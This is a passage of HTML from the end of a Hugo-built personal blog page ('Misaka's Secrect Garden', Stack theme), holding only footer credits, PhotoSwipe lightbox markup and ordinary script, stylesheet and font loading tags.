2023 Misaka's Secrect Garden</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>